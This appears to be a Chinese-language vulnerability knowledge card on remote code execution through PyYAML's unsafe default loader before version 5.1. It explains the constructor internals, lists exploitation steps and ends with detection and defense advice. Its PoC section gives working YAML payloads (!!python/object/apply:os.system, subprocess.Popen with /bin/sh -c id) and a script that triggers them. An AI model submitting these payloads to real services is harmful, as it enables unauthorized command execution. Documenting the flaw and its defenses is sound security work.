---
id: web-python-deserialization-pyyaml-default-loader-object-apply-rce
title: PyYAML 5.1 之前默认 yaml.load 即 UnsafeConstructor：!!python/object/apply|new 直接调用任意可调用对象执行命令
type: scenario
domain: web
path: web/python/deserialization
technique: pyyaml-default-loader-object-apply-rce
aliases:
- PyYAML 反序列化
- yaml.load 默认不安全
- UnsafeConstructor
- Constructor 加载器
- '!!python/object/apply'
- '!!python/object/new'
- find_python_name
- PyYAML Loader 矩阵
tags:
- python
- pyyaml
- yaml
- deserialization
- loader
- unsafe-constructor
- object-apply
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: <5.1（默认 Loader=Constructor/UnsafeConstructor 可直接执行；另含任何版本显式 Loader=yaml.Loader/yaml.UnsafeLoader 或 unsafe_load）
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-07T23:18:21+08:00'
  notes: '已对照 content.md(542 行)与 img/01-13 逐张核对：img/01 pip show PyYAML 4.2b2、img/09 payload = !!python/object/apply:os.popen [calc.exe] 弹计算器、img/11 为 PyYAML 5.1 下同一 payload 的 traceback（construct_python_object_apply constructor.py:624 -> make_python_instance:568 raise ConstructorError: while constructing a Python instance），与卡内「<5.1 默认 Constructor 可执行 / 5.1 起 FullLoader 加 isinstance(cls,type) 限制」的版本边界一致；img/02/06/07/08 的 make_python_instance/find_python_name/construct_python_object_apply 源码与卡内引用一致（含 args/kwds/state/listitems/dictitems 五键、rsplit(. ,1)、无点则 builtins、__import__ + sys.modules + getattr）；img/12/13 的 listitems->instance.extend 与卡内一致。affected_versions 依原文「yaml版本<5.1」标题保留为 <5.1 并附显式 unsafe Loader 例外，未改。未在本机用 4.x 复现（本地为 6.0.1，仅用于比对 6.0.1 里 FullConstructor 只注册 python/name、apply/new 仅在 UnsafeConstructor 注册这一事实）；未执行文中 payload。'
---

## 一句话结论

PyYAML 5.1 之前 `yaml.load(data)` 的默认 Loader 就是 `Constructor`（等同 `UnsafeConstructor`），标签后缀被 `find_python_name` 解析为 `module.attribute` 并 `getattr` 取到真实对象，随后 `make_python_instance` 直接调用它，所以 `!!python/object/apply:os.system ["id"]`、`!!python/object/new:subprocess.check_output [["id"]]` 这类一行 YAML 就能在解析阶段执行任意命令。

## 原理

- YAML 的 `!!python/object/apply` / `!!python/object/new` 属于 PyYAML 的“python 标签”。`Constructor` 通过 `add_multi_constructor('tag:yaml.org,2002:python/object/apply:', construct_python_object_apply)` 注册了前缀构造器，任何以该前缀开头的 tag 都会进入 `construct_python_object_apply(self, suffix, node, newobj=False)`。
- `construct_object` 匹配到 multi-constructor 后把 tag 去掉前缀的剩余部分作为 `suffix`，因此 `!!python/object/apply:os.system` 的 suffix 就是字符串 `os.system`，攻击者可以在 tag 里自由指定任意“模块.属性”。
- `construct_python_object_apply` 根据节点形态取参：`SequenceNode` → `args = construct_sequence(node, deep=True)`；`MappingNode` → 取 `args`/`kwds`/`state`/`listitems`/`dictitems` 五个键。随后调用 `make_python_instance(suffix, node, args, kwds, newobj)`。
- `make_python_instance` 先 `cls = self.find_python_name(suffix, node.start_mark)`，再 `return cls(*args, **kwds)`（`newobj=True` 时走 `cls.__new__(cls, *args, **kwds)`）。也就是说 YAML 里写的名字最终变成了一个 Python 调用表达式 —— 这是漏洞成立的根因：解析器把数据当成了“调用目标”。
- `find_python_name` 的解析规则：名字里含 `.` 就 `rsplit('.', 1)` 拆成 `module_name, object_name`，不含点则 `module_name='builtins'`；然后 `__import__(module_name)`、`module = sys.modules[module_name]`、`hasattr` 检查后 `getattr(module, object_name)`。5.1 之前的实现里没有 `isinstance(cls, type)` 这道“必须是类”的检查（该检查是 5.1 的 `make_python_instance(..., unsafe=False)` 才加入的），所以 `os.system`、`subprocess.check_output` 这类函数/方法也能被直接调用。
- 版本边界：5.1 起 `yaml.load` 默认改为 `FullLoader`，并对 `make_python_instance` 增加 `if not (unsafe or isinstance(cls, type)): raise ConstructorError(...)`，此时 `!!python/object/apply:os.system` 仍能找到构造器但会在构造实例时报 `expected a class, but found <class 'builtin_function_or_method'>`；`!!python/object/apply` 在部分 5.2+ 版本还被整体移除。只有 `Loader=yaml.Loader`/`yaml.UnsafeLoader`/`yaml.unsafe_load` 才恢复 `unsafe=True` 的旧行为。
- 为什么 `apply` 与 `new` 都可用：两者只差 `newobj` 标志；对函数对象而言 `newobj=False` 直接 `cls(*args)` 就执行了，`newobj=True` 时只有当 `isinstance(cls, type)` 才走 `__new__`，否则同样落到 `cls(*args, **kwds)`。

## 触发条件

- 用户可控内容进入 `yaml.load(data)`，且 PyYAML <5.1（默认 Loader 不安全）；或任何版本显式使用 `Loader=yaml.Loader` / `yaml.UnsafeLoader` / `yaml.unsafe_load` / 旧式 `yaml.load(data, yaml.Loader)`。
- 输入未被改成 `safe_load`/`SafeLoader`，也没有在解析前拒绝 `!!python/*` 标签。
- 目标进程能 import 攻击者指定的模块（`os`、`subprocess`、`builtins` 都天然可用；未 import 的第三方模块会被 `__import__` 现场加载）。

## 利用步骤

1. 指纹：`pip show pyyaml` 或异常栈里出现 `yaml/constructor.py` 行号；向可疑解析点提交 `!!python/object/apply:os.system ["echo pwn"]`。
2. 判定结果：命令执行 = 旧版默认 Loader 或显式 unsafe；返回 `could not determine a constructor for the tag` = 该 Loader 已移除 apply（改试 `!!python/object/new`）；`expected a class, but found` = 5.1+ FullLoader 限制（转其他构造链）。
3. 按需换 sink：命令执行用 `os.system`/`os.popen`/`subprocess.Popen`；要回显用 `subprocess.check_output`（注意参数要再包一层列表）；文件读取用 `builtins.open`、`linecache.getline`。
4. 结合 `!!python/object/new` 的 `state`/`listitems`/`dictitems` 三个键做后续利用（`state` → `set_python_instance_state`，`listitems` → `instance.extend`，`dictitems` → `instance[k]=v`）。

## PoC

最短形式（原样放进 `yaml.load` 的字符串参数）：

```yaml
!!python/object/apply:os.system ["calc.exe"]
```

等价变体：

```yaml
!!python/object/new:os.system ["calc.exe"]
!!python/object/apply:subprocess.check_output [["whoami"]]
```

带参数映射的写法（便于多参数/关键字参数）：

```yaml
!!python/object/apply:subprocess.Popen
args:
  - ["/bin/sh", "-c", "id"]
```

本地验证脚本（仅在自己隔离环境跑）：

```python
import yaml
print(yaml.__version__)                     # 期望 <5.1 才是默认可利用
yaml.load('!!python/object/apply:os.system ["id"]')
```

## 变体与关联

- Loader 选型：`BaseConstructor`（仅基础 YAML）、`SafeConstructor`（`safe_load`）、`FullConstructor`（5.1+ 默认，禁止 apply 且要求是类）、`UnsafeConstructor`/`Constructor`（旧默认，完全可执行）。
- 只想引用对象不调用时，`!!python/name:module.attr` 在任何非 Safe 加载器下都可用（可配合 `is` 身份比较类逻辑做认证绕过）；`!!python/module:` 可拿到模块对象本身。
- 关联：[[web-python-deserialization-pyyaml-fullconstructor-bypass-object-new]]（5.1+ FullLoader 下的 map/eval、type.extend 等绕过）、[[web-python-deser-pyyaml-tag-directive-waf-bypass-linecache]]（`%TAG` 别名绕 WAF 后仍走 apply）、[[web-python-deserialization-pyyaml-python-name-identity-bypass]]（python/name 身份比较）、[[web-python-deserialization-feast-kubernetes-materializer-yaml-load-rce]]（真实产品里 `yaml.load(Loader=yaml.Loader)` 的落地触发点）。
- 边界：`yaml.safe_load`、`SafeLoader`、解析前对 `!!python/` 与 `tag:yaml.org,2002:python/` 的白名单校验会阻断；容器化场景下命令只在该解析进程/容器内执行。
- 注意：`list`/`set` 之类的 `object/new` 会忽略传入参数（可变类型走空 `__new__` 再 `extend`），要回显优先选 `tuple`、`bytes`、`frozenset` 等不可变类型或用 `subprocess.check_output`。

## 检测与防御

- 一律 `yaml.safe_load` / `SafeLoader`；确需复杂标签时改用 JSON 或自定义 `BaseLoader` + 显式 schema 校验，绝不 `yaml.load` 处理外部输入。
- 升级 PyYAML 并避免 `Loader=yaml.Loader/UnsafeLoader/unsafe_load`；代码审计搜 `yaml.load(`、`Loader=yaml.Loader`、`unsafe_load`。
- WAF 层按 YAML 语法解析后再判定 tag，拦截 `tag:yaml.org,2002:python/` 全前缀（含 `%TAG` 展开后的等价写法）。
- 检测信号：请求体出现 `!!python/object/apply`、`object/new`、`python/name`、`%TAG`；YAML 解析抛 `ConstructorError` 且带 `python/object` 字样；Web 进程异常 spawn 子进程（`whoami`/`id`/`calc`）。
